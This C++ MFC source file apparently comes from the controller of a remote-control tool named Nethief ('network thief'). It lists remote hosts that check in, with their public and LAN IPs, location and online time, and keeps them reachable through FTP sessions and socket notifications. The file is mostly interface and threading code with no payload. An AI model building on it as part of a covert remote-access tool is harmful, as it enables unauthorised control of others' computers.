//Download by http://www.NewXing.com
// MyFormView.cpp : implementation file
//

#include "stdafx.h"
#include "Nethief.h"
#include "MyFormView.h"

#include "NethiefDoc.h"
#include "RemarkDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyFormView

IMPLEMENT_DYNCREATE(CMyFormView, CFormView)

CMyFormView::CMyFormView()
	: CFormView(CMyFormView::IDD)
{
	//{{AFX_DATA_INIT(CMyFormView)
	//}}AFX_DATA_INIT
	m_strClipBoard="";

	m_pIsOnlineThread=NULL;
	m_pConnectFtpServerThread=NULL;
	m_pKeepFtpSessionThread=NULL;
	m_pGetCallboardTextThread=NULL;
	m_pRecvNotifyThread=NULL;
	m_pAcceptTcpConnectThread=NULL;
	m_pListRefreshThread=NULL;
	m_pRefreshChatroomThread=NULL;
}

CMyFormView::~CMyFormView()
{

}

void CMyFormView::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyFormView)
	DDX_Control(pDX, IDC_STATIC_CHATROOM, m_LinkStatic_Chatroom);
	DDX_Control(pDX, IDC_EDIT_CALLBOARD, m_Edit_Callboard);
	DDX_Control(pDX, IDC_STATIC_ONLINENUM, m_Static_OnlineNum);
	DDX_Control(pDX, IDC_STATIC_POSITION, m_Static_Position);
	DDX_Control(pDX, IDC_STATIC_HOSTNAME, m_Static_HostName);
	DDX_Control(pDX, IDC_STATIC_IPADDRESS, m_Static_IPAddress);
	DDX_Control(pDX, IDC_LIST1, m_List);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyFormView, CFormView)
	//{{AFX_MSG_MAP(CMyFormView)
	ON_WM_TIMER()
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_LIST1, OnColumnclickList1)
	ON_WM_DESTROY()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST1, OnDblclkList1)
	ON_MESSAGE(WM_SOCKET,OnSocket)
	ON_NOTIFY(NM_RCLICK, IDC_LIST1, OnRclickList1)
	ON_COMMAND(ID_POPUPMENU_COPY, OnPopupmenuCopy)
	ON_WM_CTLCOLOR()
	ON_WM_SETCURSOR()
	ON_COMMAND(ID_POPUPMENU_ADD, OnPopupmenuAdd)
	ON_COMMAND(ID_POPUPMENU_REMARK, OnPopupmenuRemark)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyFormView diagnostics

#ifdef _DEBUG
void CMyFormView::AssertValid() const
{
	CFormView::AssertValid();
}

void CMyFormView::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMyFormView message handlers

void CMyFormView::OnInitialUpdate() 
{
	CFormView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	m_pDoc=(CNethiefDoc*)GetDocument();
	m_pCommunity=((CNethiefApp*)AfxGetApp())->pCommunity;

	m_hCursorHand=AfxGetApp()->LoadCursor(IDC_CURSOR_HAND);

	m_ImageList.Create(16,16,ILC_COLOR8|ILC_MASK,2,1);
	m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_REMOTEHOST));
	m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_REMOTEHOST_HTTPTUNNEL));
	m_List.SetImageList(&m_ImageList,LVSIL_SMALL);//设置关联映象列表

	m_List.InsertColumn(0,"主机名",LVCFMT_LEFT,112);
	m_List.InsertColumn(1,"互联网的IP地址",LVCFMT_LEFT,102);
	m_List.InsertColumn(2,"局域网的IP地址",LVCFMT_LEFT,102);
	m_List.InsertColumn(3,"地理位置",LVCFMT_LEFT,159);
	m_List.InsertColumn(4,"上线时间",LVCFMT_CENTER,78);
	m_List.InsertColumn(5,"在线时长",LVCFMT_CENTER,60);
	m_List.InsertColumn(6,"备注",LVCFMT_LEFT,98);

	DWORD dwExtendedSytle=m_List.GetExtendedStyle();
	dwExtendedSytle|=LVS_EX_GRIDLINES;
	m_List.SetExtendedStyle(dwExtendedSytle);
	//从文件读取服务端备注///////////
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('\\')+1);  //找到
	exeFullPath.ReleaseBuffer();

	CString strHostRemarkFilename=exeFullPath+"HostRemark.dat";//保存主机备注的文件名
	CString strHostName;//主机名
	CString strHostRemark;//主机备注

	CStdioFile File(strHostRemarkFilename,
		CFile::modeRead|CFile::shareDenyNone|CFile::typeText);
	while(File.ReadString(strHostName))//读主机名
	{
		File.ReadString(strHostRemark);//读主机备注

		m_HostRemarkMap.SetAt(strHostName,strHostRemark);//加入到映射
	}
	File.Close();
	///////////////////////////////////////////////
	SetTimer(1,1000,NULL);//IsOnline
	SetTimer(4,1000,NULL);//GetCallboardText
	OnTimer(7);
	SetTimer(7,60000,NULL);//RefreshChatroom
}

void CMyFormView::OnTimer(UINT nIDEvent)
{
	// TODO: Add your message handler code here and/or call default
	if(nIDEvent==1)//IsOnline
	{
		if(!m_pCommunity->m_bIsRegistered)//如果没注册帐号就返回
			return;
		/////////////////////////////////////////////
		if(m_pIsOnlineThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pIsOnlineThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
				return;
		}
		/////////////////////////////////////////////
		pONLINE_THREAD_PARAM pstOnline=new ONLINE_THREAD_PARAM;
		pstOnline->pCommunity=m_pCommunity;
		pstOnline->pDoc=m_pDoc;
		pstOnline->pWnd=CWnd::FromHandle(m_hWnd);

		m_pIsOnlineThread=AfxBeginThread(IsOnlineProc,(LPVOID)pstOnline);
		m_pIsOnlineThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==2)//ConnectFtpServer
	{
		if(m_pConnectFtpServerThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pConnectFtpServerThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
				return;
		}
		/////////////////////////////////////////////
		pCONN_FTP_THREAD_PARAM pstConnFtp=new CONN_FTP_THREAD_PARAM;
		pstConnFtp->pCommunity=m_pCommunity;
		pstConnFtp->pStatic_HostName=&m_Static_HostName;
		pstConnFtp->pStatic_IPAddress=&m_Static_IPAddress;
		pstConnFtp->pStatic_Position=&m_Static_Position;
		pstConnFtp->pStatic_OnlineNum=&m_Static_OnlineNum;
		pstConnFtp->pDoc=m_pDoc;
		pstConnFtp->pWnd=CWnd::FromHandle(m_hWnd);

		m_pConnectFtpServerThread=AfxBeginThread(ConnectFtpServerProc,(LPVOID)pstConnFtp);
		m_pConnectFtpServerThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==3)//KeepFtpSession
	{
		if(m_pKeepFtpSessionThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pKeepFtpSessionThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
				return;
		}
		/////////////////////////////////////////////
		pKEEP_FTP_SESSION_THREAD_PARAM pstDownload=new KEEP_FTP_SESSION_THREAD_PARAM;
		pstDownload->pCommunity=m_pCommunity;
		pstDownload->pDoc=m_pDoc;
		pstDownload->pWnd=CWnd::FromHandle(m_hWnd);

		m_pKeepFtpSessionThread=AfxBeginThread(KeepFtpSessionProc,(LPVOID)pstDownload);
		m_pKeepFtpSessionThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==4)//GetCallboardText
	{
		if(m_pGetCallboardTextThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pGetCallboardTextThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
				return;
		}
		/////////////////////////////////////////////
		pCALLBOARD_THREAD_PARAM pstCallboard=new CALLBOARD_THREAD_PARAM;
		pstCallboard->pCommunity=m_pCommunity;
		pstCallboard->pWnd=CWnd::FromHandle(m_hWnd);
		pstCallboard->pEdit_Callboard=&m_Edit_Callboard;

		m_pGetCallboardTextThread=AfxBeginThread(GetCallboardTextProc,(LPVOID)pstCallboard);
		m_pGetCallboardTextThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==5)//ListRefresh
	{
		if(m_pListRefreshThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pListRefreshThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
				return;
		}
		/////////////////////////////////////////////
		pLIST_REFRESH_THREAD_PARAM pstListRefresh=new LIST_REFRESH_THREAD_PARAM;
		pstListRefresh->pCommunity=m_pCommunity;
		pstListRefresh->pDoc=m_pDoc;
		pstListRefresh->pStatic_OnlineNum=&m_Static_OnlineNum;
		pstListRefresh->pList=&m_List;
		
		m_pListRefreshThread=AfxBeginThread(ListRefreshProc,(LPVOID)pstListRefresh);
		m_pListRefreshThread->m_bAutoDelete=FALSE;
		return;
	}
	if(nIDEvent==6)//Flash icon
	{
		m_pDoc->FlashIcon();
		return;
	}
	if(nIDEvent==7)//RefreshChatroom
	{
		if(m_pRefreshChatroomThread!=NULL)
		{
			unsigned long ExitCode;
			GetExitCodeThread(m_pRefreshChatroomThread->m_hThread,&ExitCode);
			if(ExitCode==STILL_ACTIVE)//如果线程没结束就返回
				return;
		}
		/////////////////////////////////////////////
		pCHATROOM_THREAD_PARAM pstRefreshChatroom=new CHATROOM_THREAD_PARAM;
		pstRefreshChatroom->pCommunity=m_pCommunity;
		pstRefreshChatroom->pLinkStatic_Chatroom=&m_LinkStatic_Chatroom;
		
		m_pRefreshChatroomThread=AfxBeginThread(RefreshChatroomProc,(LPVOID)pstRefreshChatroom);
		m_pRefreshChatroomThread->m_bAutoDelete=FALSE;
		return;
	}
}

UINT IsOnlineProc(LPVOID pParam)
{
	pONLINE_THREAD_PARAM pstOnline=(pONLINE_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstOnline->pCommunity;
	CNethiefDoc*	pDoc=pstOnline->pDoc;
	CMyFormView*	pWnd=(CMyFormView*)pstOnline->pWnd;
	delete pParam;
	//////////////////////////////////////////////
#if ONLINE_TEST
	if(pCommunity->IsOnline())
#endif
	{
		pDoc->m_bLogoning=TRUE;
		pDoc->SetOfflineSign();
		pWnd->KillTimer(1);//Kill IsOnline
		pWnd->SetTimer(2,1000,NULL);//ConnectFtpServer
		pWnd->SetTimer(6,200,NULL);//Flash icon
	}
	return 0;
}

UINT ConnectFtpServerProc(LPVOID pParam)
{
	pCONN_FTP_THREAD_PARAM pstConnFtp=(pCONN_FTP_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstConnFtp->pCommunity;
	CStatic*		pStatic_HostName=pstConnFtp->pStatic_HostName;
	CStatic*		pStatic_IPAddress=pstConnFtp->pStatic_IPAddress;
	CStatic*		pStatic_Position=pstConnFtp->pStatic_Position;
	CStatic*		pStatic_OnlineNum=pstConnFtp->pStatic_OnlineNum;
	CNethiefDoc*	pDoc=pstConnFtp->pDoc;
	CMyFormView*	pWnd=(CMyFormView*)pstConnFtp->pWnd;
	delete pParam;
	//////////////////////////////////////////////
	int nRet=pCommunity->ConnectFtpServer(pWnd);
	switch(nRet)
	{
		case 0:
		{
			pDoc->m_bLogoning=FALSE;
			pDoc->SetOfflineSign();
			pWnd->KillTimer(2);//Kill ConnectFtpServer
			pWnd->KillTimer(6);//Kill Flash icon
			pWnd->SetTimer(1,1000,NULL);//IsOnline
			break;
		}
		case 3:
		{
			PlaySound(MAKEINTRESOURCE(IDR_ONLINE),
				AfxGetInstanceHandle(),SND_RESOURCE|SND_ASYNC);
			pStatic_HostName->SetWindowText(pCommunity->m_strHostName);
			pStatic_IPAddress->SetWindowText(pCommunity->m_strIPAddr);
			pStatic_Position->SetWindowText(pCommunity->m_strPosition);
			CString strOnlineNum;
			strOnlineNum.Format("%d",pCommunity->m_nOnlineNum);
			pStatic_OnlineNum->SetWindowText(strOnlineNum);
			pDoc->m_strServerNum="(在线人数: "+strOnlineNum+")";
			pDoc->m_bIsOnline=TRUE;
			pDoc->m_bLogoning=FALSE;
			pDoc->SetOfflineSign();
			pWnd->KillTimer(2);//Kill ConnectFtpServer
			pWnd->KillTimer(6);//Kill Flash icon
			pWnd->SetTimer(3,60000,NULL);//KeepFtpSession
			pWnd->OnTimer(5);
			pWnd->SetTimer(5,60000,NULL);//ListRefresh
			break;
		}
	}
	return 0;
}

UINT KeepFtpSessionProc(LPVOID pParam)
{
	pKEEP_FTP_SESSION_THREAD_PARAM pstDownload=(pKEEP_FTP_SESSION_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstDownload->pCommunity;
	CNethiefDoc*	pDoc=pstDownload->pDoc;
	CMyFormView*	pWnd=(CMyFormView*)pstDownload->pWnd;
	delete pParam;
	//////////////////////////////////////////////
	if(!pCommunity->KeepFtpSession())
	{
		pDoc->m_bIsOnline=FALSE;
		pDoc->SetOfflineSign();
		pWnd->KillTimer(3);//Kill KeepFtpSession
		pWnd->KillTimer(5);//Kill ListRefresh
		pWnd->SetTimer(1,1000,NULL);//IsOnline
	}
	return 0;
}

UINT GetCallboardTextProc(LPVOID pParam)
{
	pCALLBOARD_THREAD_PARAM pstCallboard=(pCALLBOARD_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstCallboard->pCommunity;
	CEdit*			pEdit_Callboard=pstCallboard->pEdit_Callboard;
	CMyFormView*	pWnd=(CMyFormView*)pstCallboard->pWnd;
	delete pParam;
	//////////////////////////////////////////////
	if(pCommunity->GetCallboardText(pEdit_Callboard))
	{
		pWnd->KillTimer(4);//Kill GetCallboardText
	}
	return 0;
}

UINT RecvNotifyProc(LPVOID pParam)
{
	pRECV_NOTIFY_THREAD_PARAM pstRecvNotify=(pRECV_NOTIFY_THREAD_PARAM)pParam;
	CCommunity*			pCommunity=pstRecvNotify->pCommunity;
	CStatic*			pStatic_OnlineNum=pstRecvNotify->pStatic_OnlineNum;
	CNethiefDoc*		pDoc=pstRecvNotify->pDoc;
	CListCtrl*			pList=pstRecvNotify->pList;
	SOCKET				hSocket=pstRecvNotify->hSocket;
	CMapStringToString*	pHostRemarkMap=pstRecvNotify->pHostRemarkMap;
	delete pParam;
	//////////////////////////////////////////////
	if(pCommunity->RecvNotify(hSocket,pList,pHostRemarkMap))
	{
		CString strOnlineNum;
		strOnlineNum.Format("%d",pCommunity->m_nOnlineNum);
		pStatic_OnlineNum->SetWindowText(strOnlineNum);
		pDoc->m_strServerNum="(在线人数: "+strOnlineNum+")";
		pDoc->SetOfflineSign();
	}
	return 0;
}

UINT AcceptTcpConnectProc(LPVOID pParam)
{
	pACCEPT_CONNECT_THREAD_PARAM pstAcceptConnect=(pACCEPT_CONNECT_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstAcceptConnect->pCommunity;
	CMyFormView*	pWnd=(CMyFormView*)pstAcceptConnect->pWnd;
	delete pParam;
	//////////////////////////////////////////////
	pCommunity->AcceptTcpConnect(pWnd);
	return 0;
}

UINT ListRefreshProc(LPVOID pParam)
{
	pLIST_REFRESH_THREAD_PARAM pstListRefresh=(pLIST_REFRESH_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstListRefresh->pCommunity;
	CStatic*		pStatic_OnlineNum=pstListRefresh->pStatic_OnlineNum;
	CNethiefDoc*	pDoc=pstListRefresh->pDoc;
	CListCtrl*		pList=pstListRefresh->pList;
	delete pParam;
	//////////////////////////////////////////////
	if(pCommunity->ListRefresh(pList))
	{
		CString strOnlineNum;
		strOnlineNum.Format("%d",pCommunity->m_nOnlineNum);
		pStatic_OnlineNum->SetWindowText(strOnlineNum);
		pDoc->m_strServerNum="(在线人数: "+strOnlineNum+")";
		pDoc->SetOfflineSign();
	}
	return 0;
}

UINT RefreshChatroomProc(LPVOID pParam)
{
	pCHATROOM_THREAD_PARAM pstRefreshChatroom=(pCHATROOM_THREAD_PARAM)pParam;
	CCommunity*		pCommunity=pstRefreshChatroom->pCommunity;
	CLinkStatic*	pLinkStatic_Chatroom=pstRefreshChatroom->pLinkStatic_Chatroom;
	delete pParam;
	//////////////////////////////////////////////
	int nChatroomNum=pCommunity->RefreshChatroom();
	if(nChatroomNum!=-1)//等于-1为失败
	{
		CString strText;
		strText.Format("[“网络神偷”聊天室现有 %d 人]",nChatroomNum);
		pLinkStatic_Chatroom->SetWindowText(strText);
	}
	return 0;
}
//////////////////////////////////////////////////////////////////////
void CMyFormView::OnColumnclickList1(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	m_pCommunity->SortItems(&m_List,pNMListView->iSubItem);

	*pResult = 0;
}

void CMyFormView::OnDestroy()
{
	//保存服务端备注到文件/////////////////
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('\\')+1);  //找到
	exeFullPath.ReleaseBuffer();

	CString strHostRemarkFilename=exeFullPath+"HostRemark.dat";//保存主机备注的文件名
	CString strHostName;//主机名
	CString strHostRemark;//主机备注

	CStdioFile File(strHostRemarkFilename,
		CFile::modeCreate|CFile::modeWrite|CFile::shareDenyNone|CFile::typeText);

	POSITION Pos=m_HostRemarkMap.GetStartPosition();
	while(Pos!=NULL)
	{
		m_HostRemarkMap.GetNextAssoc(Pos,strHostName,strHostRemark);//从映射读出

		File.WriteString(strHostName+"\n");//写主机名
		File.WriteString(strHostRemark+"\n");//写主机备注
	}
	File.Close();
	///////////////////////////////////////
	if(m_pIsOnlineThread!=NULL)
		TerminateThread(m_pIsOnlineThread->m_hThread,0);
	if(m_pConnectFtpServerThread!=NULL)
		TerminateThread(m_pConnectFtpServerThread->m_hThread,0);
	if(m_pKeepFtpSessionThread!=NULL)
		TerminateThread(m_pKeepFtpSessionThread->m_hThread,0);
	if(m_pGetCallboardTextThread!=NULL)
		TerminateThread(m_pGetCallboardTextThread->m_hThread,0);
	if(m_pRecvNotifyThread!=NULL)
		TerminateThread(m_pRecvNotifyThread->m_hThread,0);
	if(m_pAcceptTcpConnectThread!=NULL)
		TerminateThread(m_pAcceptTcpConnectThread->m_hThread,0);
	if(m_pListRefreshThread!=NULL)
		TerminateThread(m_pListRefreshThread->m_hThread,0);
	if(m_pRefreshChatroomThread!=NULL)
		TerminateThread(m_pRefreshChatroomThread->m_hThread,0);

	CFormView::OnDestroy();
}

void CMyFormView::OnDblclkList1(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	int nDblclkItem=pNMListView->iItem;//得到双击的序号
	if(nDblclkItem!=-1)//如果是在列表项上双击
	{
		OnPopupmenuAdd();
	}	
}

//***********************************************************************//
void CMyFormView::OnSocket(WPARAM wParam,LPARAM lParam)
{
	SOCKET hSocket=wParam;	//产生事件的Socket句柄
	DWORD dwEvent=lParam;	//Socket事件
	switch(dwEvent)
	{
		case FD_READ:
		{
			pRECV_NOTIFY_THREAD_PARAM pstRecvNotify=new RECV_NOTIFY_THREAD_PARAM;
			pstRecvNotify->pCommunity=m_pCommunity;
			pstRecvNotify->pDoc=m_pDoc;
			pstRecvNotify->pStatic_OnlineNum=&m_Static_OnlineNum;
			pstRecvNotify->pList=&m_List;
			pstRecvNotify->hSocket=hSocket;
			pstRecvNotify->pHostRemarkMap=&m_HostRemarkMap;

			m_pRecvNotifyThread=AfxBeginThread(RecvNotifyProc,(LPVOID)pstRecvNotify);
			break;
		}
		case FD_ACCEPT:
		{
			pACCEPT_CONNECT_THREAD_PARAM pstAcceptConnect=new ACCEPT_CONNECT_THREAD_PARAM;
			pstAcceptConnect->pCommunity=m_pCommunity;
			pstAcceptConnect->pWnd=CWnd::FromHandle(m_hWnd);

			m_pAcceptTcpConnectThread=AfxBeginThread(AcceptTcpConnectProc,(LPVOID)pstAcceptConnect);
			break;
		}
	}	
}

//服务端在线列表里的右键菜单处理////////////////////////////////////////
void CMyFormView::OnRclickList1(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	CMenu menu;		//弹出Popup菜单
	menu.LoadMenu(IDR_POPUPMENU);
	CMenu* pPopup=menu.GetSubMenu(0);
	////////////////////////////////////////
	BOOL bNoSelect=FALSE;
	if(m_List.GetSelectedCount()==0)//是否有选择主机
		bNoSelect=TRUE;

	LVHITTESTINFO lvhti;
	lvhti.pt=pNMListView->ptAction;
	m_List.SubItemHitTest(&lvhti);
	if(lvhti.flags&LVHT_ONITEMLABEL)
	{
		if(bNoSelect)//未选择主机
		{
			pPopup->EnableMenuItem(ID_POPUPMENU_ADD,MF_BYCOMMAND|MF_GRAYED);
			pPopup->EnableMenuItem(ID_POPUPMENU_REMARK,MF_BYCOMMAND|MF_GRAYED);
		}
		m_strClipBoard=m_List.GetItemText(lvhti.iItem,lvhti.iSubItem);
	}
	else
	{
		pPopup->EnableMenuItem(ID_POPUPMENU_ADD,MF_BYCOMMAND|MF_GRAYED);
		pPopup->EnableMenuItem(ID_POPUPMENU_REMARK,MF_BYCOMMAND|MF_GRAYED);
		pPopup->EnableMenuItem(ID_POPUPMENU_COPY,MF_BYCOMMAND|MF_GRAYED);
	}
	////////////////////////////////////////
	CPoint Point;
	GetCursorPos(&Point);
	pPopup->TrackPopupMenu(TPM_LEFTALIGN,
		Point.x,Point.y,this,NULL);

	*pResult = 0;
}

void CMyFormView::OnPopupmenuAdd()//添加主机
{
	// TODO: Add your command handler code here
	BeginWaitCursor();
	int nSelectItem=-1;
	while(1)
	{
		nSelectItem=m_List.GetNextItem(nSelectItem,LVNI_SELECTED);
		if(nSelectItem==-1)
			break;
		///////////////////////////////////////////////////////
		CString strItemName=m_List.GetItemText(nSelectItem,0);

		LV_ITEM Item;
		ZeroMemory(&Item,sizeof(Item));
		Item.mask=LVIF_IMAGE;
		Item.iItem=nSelectItem;
		m_List.GetItem(&Item);

		if(m_pDoc->FindHost(strItemName,Item.iImage))
		{
			if(MessageBox("文件管理器中已包含服务端主机 ["+strItemName+"]，是否想重复添加？","添加主机"
				,MB_ICONQUESTION|MB_YESNO)==IDNO)
				continue;
		}
		m_pDoc->AddHost(strItemName,Item.iImage);
	}
	EndWaitCursor();
}

void CMyFormView::OnPopupmenuRemark()//修改备注
{
	// TODO: Add your command handler code here
	int nSelectItem=-1;
	nSelectItem=m_List.GetNextItem(nSelectItem,LVNI_SELECTED);
	if(nSelectItem==-1)//如果没有选择,就返回
		return;
	///////////////////////////////////////////////////////
	CString strHostName=m_List.GetItemText(nSelectItem,0);//主机名
	CString strHostRemark=m_List.GetItemText(nSelectItem,6);//主机备注

	CRemarkDlg dlg;
	dlg.m_strRemark=strHostRemark;
	if(dlg.DoModal()==IDOK)//是确定
	{
		/////////////////////////////////
		LV_FINDINFO fi;
		fi.flags=LVFI_STRING;
		fi.psz=strHostName;
		nSelectItem=m_List.FindItem(&fi,-1);//重新定位列表索引
		/////////////////////////////////
		if(dlg.m_strRemark=="")//新备注为空
		{
			m_HostRemarkMap.RemoveKey(strHostName);//在映射里删除这个Key
			if(nSelectItem!=-1)//如果列表里还有这个主机
				m_List.SetItemText(nSelectItem,6,dlg.m_strRemark);//更新备注显示
		}
		else
		{
			if(dlg.m_strRemark!=strHostRemark)//备注修改了
			{
				m_HostRemarkMap.SetAt(strHostName,dlg.m_strRemark);//更新映射
				if(nSelectItem!=-1)//如果列表里还有这个主机
					m_List.SetItemText(nSelectItem,6,dlg.m_strRemark);//更新备注显示
			}
		}
	}
}

void CMyFormView::OnPopupmenuCopy()//复制
{
	// TODO: Add your command handler code here
	//复制到剪贴板
	if(AfxGetMainWnd()->OpenClipboard()) 
	{
		EmptyClipboard();
		int i=m_strClipBoard.GetLength()+1;
		HGLOBAL hGlobalMem=GlobalAlloc(GMEM_MOVEABLE|GMEM_DDESHARE,i);
		memcpy((LPSTR)GlobalLock(hGlobalMem),(LPCSTR)m_strClipBoard,i);
		GlobalUnlock(hGlobalMem);
		if(!SetClipboardData(CF_TEXT,hGlobalMem)) 
			GlobalFree(hGlobalMem);
		CloseClipboard();
	}
}
////////////////////////////////////////////////////////////////////////

HBRUSH CMyFormView::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	HBRUSH hbr = CFormView::OnCtlColor(pDC, pWnd, nCtlColor);
	
	// TODO: Change any attributes of the DC here
	if(IDC_STATIC_CHATROOM==pWnd->GetDlgCtrlID())
	{
		//设置字符颜色
		pDC->SetTextColor(RGB(0,0,255));//蓝色
	}
	// TODO: Return a different brush if the default is not desired
	return hbr;
}

BOOL CMyFormView::OnSetCursor(CWnd* pWnd, UINT nHitTest, UINT message) 
{
	// TODO: Add your message handler code here and/or call default
	if(IDC_STATIC_CHATROOM==pWnd->GetDlgCtrlID())
	{
		SetCursor(m_hCursorHand);
		return TRUE;
	}	
	return CFormView::OnSetCursor(pWnd, nHitTest, message);
}
